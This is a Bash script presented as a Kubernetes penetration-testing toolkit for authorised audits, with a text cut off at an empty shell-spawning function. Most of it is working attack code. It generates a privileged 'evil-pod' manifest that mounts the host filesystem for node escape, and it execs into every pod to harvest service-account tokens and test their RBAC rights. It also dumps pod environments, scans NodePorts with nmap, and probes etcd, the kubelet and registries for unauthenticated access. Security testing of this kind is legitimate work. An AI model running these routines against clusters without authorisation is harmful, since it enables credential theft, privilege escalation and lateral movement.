#!/bin/bash

# k8s-pentest-framework (Bash version) - a small, extendable Kubernetes pentest toolkit for AppSec audits.

# Banner (scary + ONRE)
BANNER='
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+*%%@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%-:::-=++@@%+**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%::...:-++.%%===*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@#%::....-.:..#%::--#*%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-%=-:...:.*: .##:.:::+%*@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*+.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+=+=*%#+=...##+*#%#%#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%*#++=-=#--*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**-=+=*+=-:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+:-::++==%@@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-:=-:-=:-%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#-..::...::.*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##=:..-:.   ......+*+*#*#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+-..::=-.    ..:.  ..::=---*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++*-:..-=-=---:...-.     ..::-=#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*++-.::=-*****#+.-:. . ..:-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**+==-=+*%@%%%%%%+=+...:::==++*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**==*+-=#+=***=+#=:--::==+=+*#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+-=+=---.=---::..-==-++***+*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%*#=+===-:::.....:.:-=:++++***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%***=++####%##++:=-+++****#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%#*%%@@@@@@@@%#+=++*#*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@@@@@@@@%+#*##%%%%@%%*.=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@##*#*#%%@%%. -+#%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%%@@@@@@@@@@@@@@@#%##%%%@%%.:+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%=-*%@@@@@@@@@@*:+###*@%%%@@@@@@@@@@@%%#%%%@%%%.:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=.+++##@@@@@@@@##%%%%%%#%##%%%%%%%%@%%%%%%%%%#..*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=*##%%%%%@@@@@@@%%%@@%%@%%%%%%%%%@@@@%%@%%%%..:*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@%%%%@%@%%%%@@@@@@@@@@@@@%+.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@###%%%%%%%#*:%@@@@@%%%%@@%%%@@@@@@@@@@%%.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%##@@@@%@%%%%%%%@@@@@@@@%%..*%%@@*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@%#=+@@%#%%%%%%%%%+%%%#=..*#%@@@*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%@%#+=..*#%%%@@%%%*....+#%%%@@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%#=...#%%%@@@%%####%%%@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%##+.*%%%@@%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*#%%%%%%%@@%@@@@%@@@@@%@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%%%###############=. .*#%%%%%@@@%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%#:. ...... .......   .-#%%%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%#... ....-=++-:.:-==-=+*+##%%%%%%%%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%=.  ..++**####%########%#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@*:.:+*##%##%%%#%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@#+*##%%#%%%@@@@@@@@@@@@@@@%%##%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%.#%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%+...+#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#-.....=*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#........::-=*##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%#.. ..:+===*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*...:==*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%. .=*##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%#*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                     O N R E

             a tiny, extendable k8s pentest toolkit
'

# Dangerous permissions for RBAC check
DANGEROUS_PERMISSIONS=(
    "get secrets"
    "create pods"
    "delete pods"
    "get nodes"
    "create deployments"
    "patch deployments"
    "get services"
    "create services"
    "get configmaps"
    "create configmaps"
)

# Check prerequisites
check_prereqs() {
    for cmd in kubectl curl jq; do
        if ! command -v "$cmd" &> /dev/null; then
            echo "[!] $cmd not found in PATH. Install it or add to PATH."
            exit 1
        fi
    done
    if ! command -v nmap &> /dev/null; then
        echo "[!] nmap not found in PATH. Install it for NodePort scanning."
    fi
    if ! command -v etcdctl &> /dev/null; then
        echo "[!] etcdctl not found in PATH. Install it for etcd access check."
    fi
}

# Run a command, capture output if needed
run_cmd() {
    local cmd=$1
    local capture=$2
    if [ "$capture" = "true" ]; then
        output=$(eval "$cmd" 2>&1)
        return_code=$?
        echo "$output"
        return $return_code
    else
        eval "$cmd"
        return $?
    fi
}

# Run kubectl and parse JSON output
kubectl_json() {
    local cmd_tail=$1
    local output
    output=$(run_cmd "kubectl $cmd_tail -o json" true)
    local rc=$?
    if [ $rc != 0 ] || [ -z "$output" ] || ! echo "$output" | jq . >/dev/null 2>&1; then
        echo ""
        return 1
    fi
    echo "$output"
}

# Modules
pod2node_interactive() {
    echo "[1] pod2node check / privileged-pod generator"
    local nodes
    nodes=$(kubectl_json "get nodes")
    if [ -z "$nodes" ]; then
        echo "  [!] Could not get nodes. Check kubectl context and permissions."
        return
    fi

    local node_names
    node_names=$(echo "$nodes" | jq -r '.items[].metadata.name')
    if [ -z "$node_names" ]; then
        echo "  [!] No nodes found."
        return
    fi
    echo "  Found nodes: $(echo "$node_names" | wc -l)"
    local i=1
    for n in $node_names; do
        echo "   $i. $n"
        i=$((i+1))
    done

    read -p "Choose a node index to target (or press Enter to cancel): " choice
    if [ -z "$choice" ]; then
        echo "Cancelled."
        return
    fi
    local idx=$((choice - 1))
    local target_node
    target_node=$(echo "$node_names" | sed -n "$((idx+1))p")
    if [ -z "$target_node" ]; then
        echo "Invalid choice"
        return
    fi

    # Default YAML
    local yaml_template
    yaml_template="apiVersion: v1
kind: Pod
metadata:
  labels:
    run: evil-pod
  name: evil-pod
  namespace: audit
spec:
  nodeName: $target_node
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: busybox
    name: evil-pod
    command: [\"/bin/sh\", \"-c\", \"sleep infinity\"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never"

    echo -e '\nGenerated evil pod YAML (dry run):\n'
    echo "$yaml_template"

    # Offer to edit
    read -p 'Edit YAML before saving? [y/N]: ' edit_choice
    local final_yaml="$yaml_template"
    if [[ $edit_choice == y* ]]; then
        local tmp_file
        tmp_file=$(mktemp /tmp/evil-pod.XXXXXX.yml)
        echo "$yaml_template" > "$tmp_file"
        ${EDITOR:-vi} "$tmp_file"
        final_yaml=$(cat "$tmp_file")
        rm "$tmp_file"
    fi

    # Save
    read -p 'Save YAML to file path (default ./evil-pod.yml): ' save_path
    save_path=${save_path:-./evil-pod.yml}
    echo "$final_yaml" > "$save_path"
    echo "Wrote $save_path"

    # Show exact kubectl apply command (do not execute)
    echo -e '\nTo apply this manifest (ONLY in authorized test environments) run:'
    echo "  kubectl apply -f $save_path"
    echo -e '\nNote: this manifest is privileged. Do NOT apply against systems you do not own.'
}

privileged_containers_scan() {
    echo "[2] scanning for privileged containers in all namespaces..."
    local pods
    pods=$(kubectl_json "get pods --all-namespaces")
    if [ -z "$pods" ]; then
        echo "  [!] Could not list pods."
        return
    fi

    local found=""
    local items
    items=$(echo "$pods" | jq -c '.items[]')
    if [ -z "$items" ]; then
        echo "  [!] No pods found."
        return
    fi
    while IFS= read -r p; do
        local ns
        ns=$(echo "$p" | jq -r '.metadata.namespace')
        local name
        name=$(echo "$p" | jq -r '.metadata.name')
        local containers
        containers=$(echo "$p" | jq -c '.spec.containers[]')
        while IFS= read -r c; do
            local sc
            sc=$(echo "$c" | jq -c '.securityContext // {}')
            local privileged
            privileged=$(echo "$sc" | jq -r '.privileged // false')
            local allow_priv_escalation
            allow_priv_escalation=$(echo "$sc" | jq -r '.allowPrivilegeEscalation // false')
            if [ "$privileged" = "true" ] || [ "$allow_priv_escalation" = "true" ]; then
                local cname
                cname=$(echo "$c" | jq -r '.name')
                local image
                image=$(echo "$c" | jq -r '.image')
                found="$found\n   - $ns/$name container=$cname image=$image sc=$sc"
            fi
        done <<< "$containers"
    done <<< "$items"

    if [ -z "$found" ]; then
        echo '  No privileged containers found (quick scan).'
        return
    fi

    echo -e "  Found potentially privileged containers:$found"
    echo -e '\nYou can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`'
}

rbac_token_checker() {
    echo '[3] RBAC token scanner (attempts to read SA tokens from pods)'
    local api_server
    api_server=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)
    if [ -z "$api_server" ]; then
        echo '  [!] Could not determine API server URL. Aborting.'
        return
    fi

    local pods
    pods=$(kubectl_json 'get pods --all-namespaces')
    if [ -z "$pods" ]; then
        echo '  [!] Could not list pods. Aborting.'
        return
    fi

    local report=""
    local total_pods=0
    local total_dangerous=0
    local items
    items=$(echo "$pods" | jq -c '.items[]')
    while IFS= read -r p; do
        local ns
        ns=$(echo "$p" | jq -r '.metadata.namespace')
        local name
        name=$(echo "$p" | jq -r '.metadata.name')
        total_pods=$((total_pods + 1))
        echo -n "  Checking $ns/$name ... "
        local token
        token=$(kubectl exec -n "$ns" "$name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        if [ -z "$token" ]; then
            echo 'no token'
            continue
        fi

        local tmp_kubeconfig
        tmp_kubeconfig=$(mktemp /tmp/kubeconfig.XXXXXX)
        cat <<EOF > "$tmp_kubeconfig"
apiVersion: v1
kind: Config
clusters:
- name: temp-cluster
  cluster:
    insecure-skip-tls-verify: true
    server: $api_server
users:
- name: temp-user
  user:
    token: $token
contexts:
- name: temp-context
  context:
    cluster: temp-cluster
    user: temp-user
current-context: temp-context
EOF

        local dangerous_found=""
        for perm in "${DANGEROUS_PERMISSIONS[@]}"; do
            local can
            can=$(kubectl --kubeconfig="$tmp_kubeconfig" auth can-i "$perm" 2>/dev/null)
            if [ "$can" = "yes" ]; then
                dangerous_found="$dangerous_found $perm"
            fi
        done
        rm "$tmp_kubeconfig"

        if [ -n "$dangerous_found" ]; then
            total_dangerous=$((total_dangerous + 1))
            local sa_name
            sa_name=$(echo "$p" | jq -r '.spec.serviceAccountName // "unknown"')
            echo "DANGEROUS -> $dangerous_found (SA: $sa_name)"
            report="$report\n$ns/$name -> $dangerous_found (SA: $sa_name)"
        else
            echo 'ok'
        fi
    done <<< "$items"

    # Summary
    echo -e '\n--- RBAC scan summary ---'
    echo "  Pods scanned: $total_pods"
    echo "  Pods with dangerous SA perms: $total_dangerous"
    if [ -n "$report" ]; then
        echo -e '\nDetailed findings:'
        echo -e "$report"
    fi
    local ts
    ts=$(date +%Y%m%d_%H%M%S)
    local report_path="/tmp/k8s_rbac_report_$ts.txt"
    echo -e "$report" > "$report_path"
    echo "  Full report saved to: $report_path"
}

ingress_checker() {
    echo '[4] ingress controller version and CVE-2025-1974 PoC helper'
    echo "  (Bash version: Limited functionality. Use Python version for full ingress checks.)"
    local namespaces="ingress-nginx kube-system default"
    for ns in $namespaces; do
        local pods
        pods=$(kubectl_json "get pods -n $ns")
        if [ -n "$pods" ]; then
            local items
            items=$(echo "$pods" | jq -c '.items[]')
            while IFS= read -r p; do
                local name
                name=$(echo "$p" | jq -r '.metadata.name')
                if echo "$name" | grep -qi 'ingress\|nginx\|controller'; then
                    local containers
                    containers=$(echo "$p" | jq -c '.spec.containers[]')
                    while IFS= read -r c; do
                        local image
                        image=$(echo "$c" | jq -r '.image')
                        echo "  Found $ns/$name -> image=$image"
                    done <<< "$containers"
                fi
            done <<< "$items"
        fi
    done
    echo -e '\nFor full CVE-2025-1974 checks and PoC generation, use the Python version.'
}

nodeport_scanner() {
    echo '[5] NodePort scanner'
    local services
    services=$(kubectl_json 'get svc --all-namespaces')
    if [ -z "$services" ]; then
        echo '  Could not list services.'
        return
    fi

    local nodeports=""
    local items
    items=$(echo "$services" | jq -c '.items[]')
    while IFS= read -r s; do
        local type
        type=$(echo "$s" | jq -r '.spec.type')
        if [ "$type" = "NodePort" ]; then
            local ns
            ns=$(echo "$s" | jq -r '.metadata.namespace')
            local name
            name=$(echo "$s" | jq -r '.metadata.name')
            local ports
            ports=$(echo "$s" | jq -c '.spec.ports[]')
            while IFS= read -r p; do
                local nport
                nport=$(echo "$p" | jq -r '.nodePort')
                local port
                port=$(echo "$p" | jq -r '.port')
                local proto
                proto=$(echo "$p" | jq -r '.protocol')
                nodeports="$nodeports\n   - $ns/$name nodePort=$nport targetPort=$port proto=$proto"
            done <<< "$ports"
        fi
    done <<< "$items"

    if [ -z "$nodeports" ]; then
        echo '  No NodePort services found.'
        return
    fi

    echo -e "  Found NodePort services:$nodeports"

    # Show nodes' IPs
    local nodes
    nodes=$(kubectl_json 'get nodes')
    if [ -n "$nodes" ]; then
        local items
        items=$(echo "$nodes" | jq -c '.items[]')
        while IFS= read -r n; do
            local name
            name=$(echo "$n" | jq -r '.metadata.name')
            local addrs
            addrs=$(echo "$n" | jq -c '.status.addresses[]')
            local ips=""
            while IFS= read -r a; do
                local type
                type=$(echo "$a" | jq -r '.type')
                if [ "$type" = "ExternalIP" ] || [ "$type" = "InternalIP" ]; then
                    local address
                    address=$(echo "$a" | jq -r '.address')
                    ips="$ips $address"
                fi
            done <<< "$addrs"
            echo "  Node $name -> $ips"
        done <<< "$items"
    fi
    echo -e '\nTry <node-ip>:<nodePort> from your testing host if network permits.'

    read -p 'Run nmap scan on ports 30000-32767 for nodes? [y/N]: ' scan_choice
    if [[ $scan_choice == y* ]]; then
        if ! command -v nmap &> /dev/null; then
            echo "[!] nmap not found. Install nmap to use this feature."
            return
        fi
        if [ -n "$nodes" ]; then
            local items
            items=$(echo "$nodes" | jq -c '.items[]')
            while IFS= read -r n; do
                local name
                name=$(echo "$n" | jq -r '.metadata.name')
                local addrs
                addrs=$(echo "$n" | jq -c '.status.addresses[]')
                local ips=""
                while IFS= read -r a; do
                    local type
                    type=$(echo "$a" | jq -r '.type')
                    if [ "$type" = "ExternalIP" ] || [ "$type" = "InternalIP" ]; then
                        local address
                        address=$(echo "$a" | jq -r '.address')
                        ips="$ips $address"
                    fi
                done <<< "$addrs"
                if [ -n "$ips" ]; then
                    local ip
                    ip=$(echo "$ips" | awk '{print $1}')
                    echo -e "\nScanning Node $name IP $ip ports 30000-32767..."
                    nmap -sV -p 30000-32767 "$ip"
                fi
            done <<< "$items"
        else
            echo '  No nodes found for scanning.'
        fi
    fi
}

env_info() {
    echo "[6] Gaining Environment Information from a pod"
    local pods
    pods=$(kubectl_json "get pods --all-namespaces")
    if [ -z "$pods" ]; then
        echo "  [!] Could not list pods."
        return
    fi

    local pod_list=""
    local items
    items=$(echo "$pods" | jq -c '.items[]')
    while IFS= read -r p; do
        local ns
        ns=$(echo "$p" | jq -r '.metadata.namespace')
        local name
        name=$(echo "$p" | jq -r '.metadata.name')
        pod_list="$pod_list\n$ns/$name"
    done <<< "$items"

    if [ -z "$pod_list" ]; then
        echo '  No pods found.'
        return
    fi

    echo -e "  Found pods:$pod_list"
    read -p "Choose a pod index to inspect (or press Enter to cancel): " choice
    if [ -z "$choice" ]; then
        echo "Cancelled."
        return
    fi
    local idx=$((choice - 1))
    local selected_pod
    selected_pod=$(echo -e "$pod_list" | sed -n "$((idx+1))p")
    local ns
    ns=$(echo "$selected_pod" | cut -d'/' -f1)
    local name
    name=$(echo "$selected_pod" | cut -d'/' -f2)
    if [ -z "$ns" ] || [ -z "$name" ]; then
        echo "Invalid choice"
        return
    fi

    local commands=(
        "env"
        "cat /etc/hosts"
        "cat /etc/resolv.conf"
        "ip route show"
        "ifconfig"
    )

    for cmd in "${commands[@]}"; do
        echo -e "\nExecuting: $cmd in $ns/$name"
        local output
        output=$(kubectl exec -n "$ns" "$name" -- $cmd 2>&1)
        if [ $? -eq 0 ]; then
            echo "$output"
        else
            echo "  [!] Failed: $output"
        fi
    done

    echo -e '\nUse this information for further reconnaissance and attacks.'
}

registry_scanner() {
    echo "[7] Search for registries in the cluster"
    local services
    services=$(kubectl_json 'get svc --all-namespaces')
    if [ -z "$services" ]; then
        echo '  Could not list services.'
        return
    fi

    local registries=""
    local items
    items=$(echo "$services" | jq -c '.items[]')
    while IFS= read -r s; do
        local ns
        ns=$(echo "$s" | jq -r '.metadata.namespace')
        local name
        name=$(echo "$s" | jq -r '.metadata.name')
        local ports
        ports=$(echo "$s" | jq -c '.spec.ports[]')
        while IFS= read -r p; do
            local port
            port=$(echo "$p" | jq -r '.port')
            if [ "$port" = "5000" ] || echo "$name" | grep -qi 'registry'; then
                local cluster_ip
                cluster_ip=$(echo "$s" | jq -r '.spec.clusterIP')
                local domain="$name.$ns.svc.cluster.local"
                registries="$registries\n   - $ns/$name IP=$cluster_ip domain=$domain port=$port"
            fi
        done <<< "$ports"
    done <<< "$items"

    if [ -z "$registries" ]; then
        echo '  No potential registries found (port 5000 or name containing "registry").'
        return
    fi

    echo -e "  Found potential registries:$registries"
    while IFS= read -r reg; do
        if [ -z "$reg" ]; then continue; fi
        local ns
        ns=$(echo "$reg" | awk '{print $2}' | cut -d'/' -f1)
        local name
        name=$(echo "$reg" | awk '{print $2}' | cut -d'/' -f2)
        local domain
        domain=$(echo "$reg" | awk '{print $4}' | cut -d'=' -f2)
        local port
        port=$(echo "$reg" | awk '{print $5}' | cut -d'=' -f2)
        echo "    Checking /v2/_catalog for $domain:$port..."
        local output
        output=$(curl -s -m 5 "http://$domain:$port/v2/_catalog" 2>&1)
        if [ $? -eq 0 ]; then
            if echo "$output" | grep -qi 'login\|401\|403'; then
                echo '      [!] Authentication required (401/403 or login prompt)'
            else
                echo '      No authentication (200 OK):'
                echo "      ${output:0:200}..." # Truncate long output
            fi
        else
            echo "      [!] Failed to access: $output"
        fi
    done <<< "$registries"

    echo -e '\nNote: If HTTPS, try https:// with -k for curl. This checks for auth on registries.'
}

ns_bypass() {
    echo "[8] Kubernetes namespaces bypass check"
    local namespaces
    namespaces=$(kubectl_json "get namespaces")
    if [ -z "$namespaces" ]; then
        echo "  [!] Could not list namespaces."
        return
    fi

    local ns_names
    ns_names=$(echo "$namespaces" | jq -r '.items[].metadata.name')
    if [ -z "$ns_names" ]; then
        echo "  [!] No namespaces found."
        return
    fi
    echo "  Found namespaces: $(echo "$ns_names" | wc -l)"
    for name in $ns_names; do
        echo -e "\nChecking access to pods in namespace $name..."
        local output
        output=$(kubectl get pods -n "$name" 2>&1)
        if [ $? -eq 0 ]; then
            echo '  Accessible! Pods:'
            echo "$output"
        else
            echo '  Not accessible (RBAC restriction?):'
            echo "$output"
        fi
    done

    echo -e '\nThis checks RBAC permissions for getting pods in each namespace.'
    echo 'Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.'
}

core_components_check() {
    echo "[9] Core components check (apiserver, etcd, kubelet)"

    # Check kube-apiserver flags (--anonymous-auth, --insecure-port)
    echo -e "\nChecking kube-apiserver flags (--anonymous-auth, --insecure-port)..."
    local apiserver_pods
    apiserver_pods=$(kubectl_json "get pods -n kube-system -l component=kube-apiserver")
    if [ -z "$apiserver_pods" ]; then
        echo "  [!] Could not find kube-apiserver pods."
    else
        local items
        items=$(echo "$apiserver_pods" | jq -c '.items[]')
        while IFS= read -r p; do
            local name
            name=$(echo "$p" | jq -r '.metadata.name')
            local output
            output=$(kubectl exec -n kube-system "$name" -- cat /proc/1/cmdline 2>&1)
            if [ $? -eq 0 ]; then
                local cmdline
                cmdline=$(echo "$output" | tr '\0' ' ')
                echo "  Pod $name:"
                if echo "$cmdline" | grep -q -- '--anonymous-auth=true'; then
                    echo "    [!] --anonymous-auth=true (anonymous access enabled)"
                else
                    echo "    --anonymous-auth=false (ok)"
                fi
                if echo "$cmdline" | grep -q -- '--insecure-port='; then
                    echo "    [!] --insecure-port enabled (insecure HTTP port)"
                else
                    echo "    --insecure-port not enabled (ok)"
                fi
            else
                echo "  [!] Failed to get cmdline for $name: $output"
            fi
        done <<< "$items"
    fi

    # Check etcd (access without TLS)
    echo -e "\nChecking etcd access without TLS (port 2379)..."
    local etcd_pods
    etcd_pods=$(kubectl_json "get pods -n kube-system -l component=etcd")
    if [ -z "$etcd_pods" ]; then
        echo "  [!] Could not find etcd pods."
    else
        local items
        items=$(echo "$etcd_pods" | jq -c '.items[]')
        while IFS= read -r p; do
            local name
            name=$(echo "$p" | jq -r '.metadata.name')
            local node_name
            node_name=$(echo "$p" | jq -r '.spec.nodeName')
            local node
            node=$(kubectl_json "get node $node_name")
            if [ -n "$node" ]; then
                local ips
                ips=$(echo "$node" | jq -r '.status.addresses[] | select(.type=="InternalIP") | .address')
                if [ -n "$ips" ]; then
                    local etcd_ip
                    etcd_ip=$(echo "$ips" | head -n1)
                    echo "  Trying curl on etcd at $etcd_ip:2379/version..."
                    local output
                    output=$(curl -s -m 5 "http://$etcd_ip:2379/version" 2>&1)
                    if [ $? -eq 0 ]; then
                        echo "    [!] Accessible without TLS: $output"
                    else
                        echo "    Not accessible without TLS (ok or requires TLS/auth)"
                    fi
                    # etcdctl check
                    if command -v etcdctl &> /dev/null; then
                        echo -e "\nChecking etcd access with etcdctl (read all keys)..."
                        local etcd_output
                        etcd_output=$(etcdctl --endpoints="http://$etcd_ip:2379" get / --prefix --keys-only 2>&1)
                        if [ $? -eq 0 ]; then
                            echo "    [!] Accessible without auth/TLS: ${etcd_output:0:200}..."
                        else
                            echo "    Not accessible (ok): $etcd_output"
                        fi
                    else
                        echo -e "\n[!] etcdctl not found. Skip etcdctl check."
                    fi
                else
                    echo "  [!] No InternalIP for node $node_name"
                fi
            else
                echo "  [!] Could not get node $node_name"
            fi
        done <<< "$items"
    fi

    # Check kubelet (anonymous access via 10250 port)
    echo -e "\nChecking kubelet anonymous access (port 10250)..."
    local nodes
    nodes=$(kubectl_json "get nodes")
    if [ -z "$nodes" ]; then
        echo "  [!] Could not get nodes."
    else
        local items
        items=$(echo "$nodes" | jq -c '.items[]')
        while IFS= read -r n; do
            local name
            name=$(echo "$n" | jq -r '.metadata.name')
            local ips
            ips=$(echo "$n" | jq -r '.status.addresses[] | select(.type=="InternalIP") | .address')
            if [ -n "$ips" ]; then
                local kubelet_ip
                kubelet_ip=$(echo "$ips" | head -n1)
                echo "  Trying anonymous access to kubelet at $kubelet_ip:10250/pods..."
                local output
                output=$(curl -k -s -m 5 "https://$kubelet_ip:10250/pods" 2>&1)
                if [ $? -eq 0 ] && ! echo "$output" | grep -qi 'Unauthorized'; then
                    echo "    [!] Anonymous access allowed: Returns pods info"
                else
                    echo "    Anonymous access denied (ok)"
                fi
            else
                echo "  [!] No InternalIP for node $name"
            fi
        done <<< "$items"
    fi

    echo -e '\nCore components check complete. Review for vulnerabilities.'
}

spawn_shell() {
